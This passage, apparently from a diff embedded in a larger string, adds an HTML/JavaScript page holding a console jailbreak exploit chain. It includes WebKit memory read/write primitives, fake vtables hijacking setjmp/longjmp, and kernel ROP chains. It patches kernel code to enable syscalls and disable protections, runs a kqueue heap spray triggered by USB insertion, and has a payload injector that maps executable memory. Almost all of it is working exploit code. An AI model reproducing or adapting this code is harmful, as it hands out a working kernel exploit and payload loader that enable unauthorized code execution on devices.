+
+        nogc.push(og_array);
+        return og_array;
+    }
+
+    function stringify(str) {
+        var bufView = new Uint8Array(str.length + 1);
+        for (var i = 0; i < str.length; i++) {
+            bufView[i] = str.charCodeAt(i) & 0xFF;
+        }
+        window.nogc.push(bufView);
+        return p.read8(p.leakval(bufView).add32(0x10));
+    }
+
+    function readstr(addr) {
+        var str = \"\";
+        for (var i = 0;; i++) {
+            var c = p.read1(addr.add32(i));
+            if (c == 0x0) {
+                break;
+            }
+            str += String.fromCharCode(c);
+
+        }
+        return str;
+    }
+
+    function array_from_address(addr, size) {
+        var og_array = new Uint32Array(0x1000);
+        var og_array_i = p.leakval(og_array).add32(0x10);
+
+        p.write8(og_array_i, addr);
+        p.write4(og_array_i.add32(8), size);
+
+        nogc.push(og_array);
+        return og_array;
+    }
+
+    var fakeVtable_setjmp = p.malloc32(0x200);
+    var fakeVtable_longjmp = p.malloc32(0x200);
+    var original_context = p.malloc32(0x40);
+    var modified_context = p.malloc32(0x40);
+
+    p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
+    p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
+    p.write8(fakeVtable_setjmp.add32(0x10), original_context);
+    p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
+    p.write8(fakeVtable_setjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]
+
+    p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
+    p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
+    p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
+    p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
+    p.write8(fakeVtable_longjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]
+
+    function launch_chain(chain) {
+        chain.push(window.gadgets[\"pop rdi\"]);
+        chain.push(original_context);
+        chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
+
+        p.write8(textAreaVtPtr, fakeVtable_setjmp);
+        textArea.scrollLeft = 0x0;
+        p.write8(modified_context.add32(0x00), window.gadgets[\"ret\"]);
+        p.write8(modified_context.add32(0x10), chain.stack);
+        p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))
+
+        p.write8(textAreaVtPtr, fakeVtable_longjmp);
+        textArea.scrollLeft = 0x0;
+        p.write8(textAreaVtPtr, textAreaVtable);
+    }
+
+    var kview = new Uint8Array(0x1000);
+    var kstr = p.leakval(kview).add32(0x10);
+    var orig_kview_buf = p.read8(kstr);
+
+    p.write8(kstr, window.libKernelBase);
+    p.write4(kstr.add32(8), 0x40000);
+    var countbytes;
+
+    for (var i = 0; i < 0x40000; i++) {
+        if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
+            countbytes = i;
+            break;
+        }
+    }
+    p.write4(kstr.add32(8), countbytes + 32);
+    var dview32 = new Uint32Array(1);
+    var dview8 = new Uint8Array(dview32.buffer);
+    for (var i = 0; i < countbytes; i++) {
+        if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
+            dview8[0] = kview[i + 3];
+            dview8[1] = kview[i + 4];
+            dview8[2] = kview[i + 5];
+            dview8[3] = kview[i + 6];
+            var syscallno = dview32[0];
+            window.syscalls[syscallno] = window.libKernelBase.add32(i);
+        }
+    }
+    p.write8(kstr, orig_kview_buf);
+
+    chain = new rop();
+}
+
+
+function injectPayload() //single payload inject for both conditions/removed need for binloader/netcat etc - stooged
+{
+	var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
+	##PAYLOAD##
+	var bufLen = payload.length * 4
+	var payload_loader = p.malloc32(bufLen);
+	var loader_writer = payload_loader.backing;
+	for(var i=0; i < payload.length; i++)
+	{
+		loader_writer[i] = payload[i];
+	}
+	chain.syscall(74, payload_loader, bufLen, (0x1 | 0x2 | 0x4));
+	var pthread = p.malloc(0x10);
+	chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
+	donemsg();
+}
+
+
+
+function run_hax() {
+    userland();
+    if (chain.syscall(23, 0).low != 0x0) {
+       kernel();
+	   //this wk exploit is pretty stable we can probably afford to kill webkit before payload loader but should we?.
+    }
+	// load payload mod / html payloads with delay - stooged
+	payloadmsg();
+	setTimeout(injectPayload, 3000);
+}
+
+
+function kernel() {
+    extra_gadgets();
+    kchain_setup();
+    object_setup();
+    trigger_spray();
+}
+
+var handle;
+var random_path;
+var ex_info;
+
+function load_prx(name) {
+    //sys_dynlib_load_prx
+    var res = chain.syscall(594, p.stringify(`/${random_path}/common/lib/${name}`), 0x0, handle, 0x0);
+    if (res.low != 0x0) {
+        alert(\"failed to load prx/get handle \" + name);
+    }
+    //sys_dynlib_get_info_ex
+    p.write8(ex_info, 0x1A8);
+    res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
+    if (res.low != 0x0) {
+        alert(\"failed to get module info from handle\");
+    }
+    var tlsinit = p.read8(ex_info.add32(0x110));
+    var tlssize = p.read4(ex_info.add32(0x11C));
+
+    if (tlssize != 0) {
+        if (name == \"libSceWebKit2.sprx\") {
+            tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
+        } else {
+            alert(`${name}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`);
+        }
+    }
+    return tlsinit;
+}
+
+function extra_gadgets() {
+    handle = p.malloc(0x150);
+    var randomized_path_ptr = handle.add32(0x4);
+    ex_info = randomized_path_ptr.add32(0x30);
+
+    chain.syscall(602, 0, randomized_path_ptr);
+    random_path = p.readstr(randomized_path_ptr);
+
+    var ipmi_addr = load_prx(\"libSceIpmi.sprx\");
+    var hmd_addr = load_prx(\"libSceHmd.sprx\");
+    var wk2_addr = load_prx(\"libSceWebKit2.sprx\");
+
+    for (var gadget in hmd_gadgetmap) {
+        window.gadgets[gadget] = hmd_addr.add32(hmd_gadgetmap[gadget]);
+    }
+    for (var gadget in wk2_gadgetmap) {
+        window.gadgets[gadget] = wk2_addr.add32(wk2_gadgetmap[gadget]);
+    }
+    for (var gadget in ipmi_gadgetmap) {
+        window.gadgets[gadget] = ipmi_addr.add32(ipmi_gadgetmap[gadget]);
+    }
+
+    for (var gadget in window.gadgets) {
+        p.read8(window.gadgets[gadget]);
+    }
+}
+
+function kchain_setup() {
+    const KERNEL_setidt = 0x312c40;
+    const KERNEL_setcr0 = 0x1FB949;
+    const KERNEL_Xill = 0x17d500;
+    const KERNEL_veriPatch = 0x626874;
+    const KERNEL_enable_syscalls_1 = 0x490;
+    const KERNEL_enable_syscalls_2 = 0x4B5;
+    const KERNEL_enable_syscalls_3 = 0x4B9;
+    const KERNEL_enable_syscalls_4 = 0x4C2;
+    const KERNEL_mprotect = 0x80B8D;
+    const KERNEL_prx = 0x23AEC4;
+    const KERNEL_dlsym_1 = 0x23B67F;
+    const KERNEL_dlsym_2 = 0x221b40;
+
+
+    const KERNEL_setuid = 0x1A06;
+    const KERNEL_syscall11_1 = 0x1100520;
+    const KERNEL_syscall11_2 = 0x1100528;
+    const KERNEL_syscall11_3 = 0x110054C;
+    const KERNEL_syscall11_gadget = 0x4c7ad;
+    const KERNEL_mmap = 0x16632A;
+    const KERNEL_setcr0_patch = 0x3ade3B;
+    const KERNEL_kqueue_close_epi = 0x398991;
+
+    SAVED_KERNEL_STACK_PTR = p.malloc(0x200);
+    KERNEL_BASE_PTR = SAVED_KERNEL_STACK_PTR.add32(0x8);
+    //negative offset of kqueue string to kernel base
+    //0xFFFFFFFFFF86B593 0x505
+    //0xFFFFFFFFFF80E364 0x900
+    p.write8(KERNEL_BASE_PTR, new int64(0xFF80E364, 0xFFFFFFFF));
+
+    kchain = new rop();
+    kchain2 = new rop();
+
+    kchain.count = 0;
+    kchain2.count = 0;
+
+    kchain.set_kernel_var(KERNEL_BASE_PTR);
+    kchain2.set_kernel_var(KERNEL_BASE_PTR);
+
+    kchain.push(gadgets[\"pop rax\"]);
+    kchain.push(SAVED_KERNEL_STACK_PTR);
+    kchain.push(gadgets[\"mov [rax], rdi\"]);
+    kchain.push(gadgets[\"pop r8\"]);
+    kchain.push(KERNEL_BASE_PTR);
+    kchain.push(gadgets[\"add [r8], r12\"]);
+
+
+
+    var idx1 = kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);
+    var idx2 = kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);
+    //Modify UD
+    kchain.push(gadgets[\"pop rdi\"]);
+    kchain.push(0x6);
+    kchain.push(gadgets[\"pop rsi\"]);
+    kchain.push(gadgets[\"mov rsp, rdi\"]);
+    kchain.push(gadgets[\"pop rdx\"]);
+    kchain.push(0xE);
+    kchain.push(gadgets[\"pop rcx\"]);
+    kchain.push(0x0);
+    kchain.push(gadgets[\"pop r8\"]);
+    kchain.push(0x0);
+    var idx1_dest = kchain.get_rsp();
+    kchain.pushSymbolic(); // overwritten with KERNEL_setidt
+
+    kchain.push(gadgets[\"pop rsi\"]);
+    kchain.push(0x80040033);
+    kchain.push(gadgets[\"pop rdi\"]);
+    kchain.push(kchain2.stack);
+    var idx2_dest = kchain.get_rsp();
+    kchain.pushSymbolic(); // overwritten with KERNEL_setcr0
+
+    kchain.finalizeSymbolic(idx1, idx1_dest);
+    kchain.finalizeSymbolic(idx2, idx2_dest);
+
+    //Restore original UD
+
+    var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
+    var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
+    kchain2.push(gadgets[\"pop rdi\"]);
+    kchain2.push(0x6);
+    kchain2.push(gadgets[\"pop rsi\"]);
+    var idx3_dest = kchain2.get_rsp();
+    kchain2.pushSymbolic(); // overwritten with KERNEL_Xill
+    kchain2.push(gadgets[\"pop rdx\"]);
+    kchain2.push(0xE);
+    kchain2.push(gadgets[\"pop rcx\"]);
+    kchain2.push(0x0);
+    kchain2.push(gadgets[\"pop r8\"]);
+    kchain2.push(0x0);
+    var idx4_dest = kchain2.get_rsp();
+    kchain2.pushSymbolic(); // overwritten with KERNEL_setidt 
+
+    kchain2.finalizeSymbolic(idx3, idx3_dest);
+    kchain2.finalizeSymbolic(idx4, idx4_dest);
+
+    //Apply kernel patches    
+
+    kchain2.kwrite4(KERNEL_veriPatch, 0x83489090);
+
+    kchain2.kwrite4(KERNEL_enable_syscalls_1, 0x00000000);
+    //patch in reverse because /shrug
+    kchain2.kwrite4(KERNEL_enable_syscalls_4, 0x04EB69EB);
+    kchain2.kwrite4(KERNEL_enable_syscalls_3, 0x3B489090);
+    kchain2.kwrite4(KERNEL_enable_syscalls_2, 0xC9859090);
+
+    kchain2.kwrite4(KERNEL_setuid, 0x8B482AEB);
+    kchain2.kwrite4(KERNEL_mprotect, 0x00000000);
+    kchain2.kwrite4(KERNEL_prx, 0x00C0E990);
+    kchain2.kwrite4(KERNEL_dlsym_1, 0x8B484CEB);
+    kchain2.kwrite4(KERNEL_dlsym_2, 0xC3C03148);
+
+    kchain2.kwrite4(KERNEL_mmap, 0x37B24137);
+
+    kchain2.kwrite4(KERNEL_syscall11_1, 0x00000002);
+    kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
+    kchain2.kwrite4(KERNEL_syscall11_3, 0x00000001);
+
+    //Restore CR0
+    kchain2.kwrite4(KERNEL_setcr0_patch, 0xC3C7220F);
+    var idx5 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);
+    kchain2.push(gadgets[\"pop rdi\"]);
+    kchain2.push(0x80050033);
+    var idx5_dest = kchain2.get_rsp();
+    kchain2.pushSymbolic(); // overwritten with KERNEL_setcr0_patch
+    kchain2.finalizeSymbolic(idx5, idx5_dest);
+
+
+    //Recover
+    kchain2.rax_kernel(KERNEL_kqueue_close_epi);
+    kchain2.push(gadgets[\"mov rdx, rax\"]);
+    kchain2.push(gadgets[\"pop rsi\"]);
+    kchain2.push(SAVED_KERNEL_STACK_PTR);
+    kchain2.push(gadgets[\"mov rax, [rsi]\"]);
+    kchain2.push(gadgets[\"pop rcx\"]);
+    kchain2.push(0x10);
+    kchain2.push(gadgets[\"add rax, rcx\"]);
+    kchain2.push(gadgets[\"mov [rax], rdx\"]);
+    kchain2.push(gadgets[\"pop rdi\"]);
+    var idx6 = kchain2.pushSymbolic();
+    kchain2.push(gadgets[\"mov [rdi], rax\"]);
+    kchain2.push(gadgets[\"sti\"]);
+    kchain2.push(gadgets[\"pop rsp\"]);
+    var idx6_dest = kchain2.get_rsp();
+    kchain2.pushSymbolic(); // overwritten with old stack pointer
+    kchain2.finalizeSymbolic(idx6, idx6_dest);
+}
+
+function object_setup() {
+    //Map fake object
+    var fake_knote = chain.syscall(477, 0x4000, 0x4000 * 0x3, 0x3, 0x1012, 0xFFFFFFFF, 0x0);
+    var fake_filtops = fake_knote.add32(0x4000);
+    var fake_obj = fake_knote.add32(0x8000);
+    if (fake_knote.low != 0x4000) {
+        alert(\"enomem: \" + fake_knote);
+        while (1);
+    }
+    //setup fake object
+    //KNOTE
+    {
+        p.write8(fake_knote, fake_obj);
+        p.write8(fake_knote.add32(0x68), fake_filtops)
+    }
+    //FILTOPS
+    {
+        p.write8(fake_filtops.sub32(0x79), gadgets[\"cli ; pop rax\"]); //cli ; pop rax ; ret
+        p.write8(fake_filtops.add32(0x0), gadgets[\"xchg rdi, rsp ; call [rsi - 0x79]\"]); //xchg rdi, rsp ; call qword ptr [rsi - 0x79]
+        p.write8(fake_filtops.add32(0x8), kchain.stack);
+        p.write8(fake_filtops.add32(0x10), gadgets[\"mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]\"]); //mov rcx, qword ptr [rdi] ; mov rsi, rax ; call qword ptr [rcx + 0x30]
+    }
+    //OBJ
+    {
+        p.write8(fake_obj.add32(0x30), gadgets[\"mov rdi, [rax + 8] ; call [rax]\"]); //mov rdi, qword ptr [rax + 8] ; call qword ptr [rax]
+    }
+}
+
+
+
+var trigger_spray = function () {
+    //Make socket <= 0xFF | -> alloc 0x800
+
+
+    var NUM_KQUEUES = 0x1B0;
+    var kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4);
+    //Make Kqueues
+    {
+        for (var i = 0; i < NUM_KQUEUES; i++) {
+            chain.fcall(window.syscalls[362]);
+            chain.write_result4(kqueue_ptr.add32(0x4 * i));
+        }
+    }
+    chain.run();
+    var kqueues = p.array_from_address(kqueue_ptr, NUM_KQUEUES);
+
+    var that_one_socket = chain.syscall(97, 2, 1, 0);
+    if (that_one_socket.low < 0x100 || that_one_socket.low >= 0x200) {
+        alert(\"invalid socket\");
+        while (1);
+    }
+
+    //Spray kevents
+    var kevent = p.malloc(0x20);
+    p.write8(kevent.add32(0x0), that_one_socket);
+    p.write4(kevent.add32(0x8), 0xFFFF + 0x010000);
+    p.write4(kevent.add32(0xC), 0x0);
+    p.write8(kevent.add32(0x10), 0x0);
+    p.write8(kevent.add32(0x18), 0x0); {
+        for (var i = 0; i < NUM_KQUEUES; i++) {
+            chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
+        }
+    }
+    chain.run();
+
+    //Fragment memory
+    {
+        for (var i = 20; i < NUM_KQUEUES; i += 2) {
+            chain.fcall(window.syscalls[6], kqueues[i]);
+        }
+    }
+    chain.run();
+
+    //Trigger OOB
+    alert(\"Insert USB Drive And Click OK When You See The Popup Notification\");
+	
+    //Trigger corrupt knote
+    {
+        for (var i = 1; i < NUM_KQUEUES; i += 2) {
+            chain.fcall(window.syscalls[6], kqueues[i]);
+        }
+    }
+    chain.run();
+	if (chain.syscall(23, 0).low == 0) {
+		return;
+	}
+	alert(\"failed to trigger exploit kernel heap might be corrupted, try again or reboot the console\");
+    p.write8(0, 0);
+	return;
+}
+</script>
+<script src=\"./webkit.js\"></script>
+</head>
+<body onload=\"setTimeout(poc, 1500);\">
+<div id=\"exploit\" class=\"info\">Loading Exploit, Please Wait ...</div>
+<div id=\"payload\" class=\"info\" style=\"display:none;\">Loading Payload...</div>
+<div id=\"done\" class=\"info\" style=\"display:none;\">Payload Loaded.</div>
+</body>
+</html>"""
